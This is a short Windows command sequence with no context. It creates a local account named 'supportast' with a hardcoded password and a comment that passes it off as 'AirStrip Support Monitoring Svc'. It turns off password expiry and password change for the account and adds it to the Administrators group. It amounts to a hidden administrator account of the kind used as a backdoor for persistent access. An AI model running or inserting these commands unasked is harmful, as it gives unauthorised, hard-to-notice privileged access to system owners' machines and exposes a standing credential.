net user supportast A1rstr1p!2017! /add /comment:"AirStrip Support Monitoring Svc" /passwordchg:NO
wmic useraccount where "name='supportast'" set passwordexpires=FALSE
net localgroup "Administrators" supportast /add


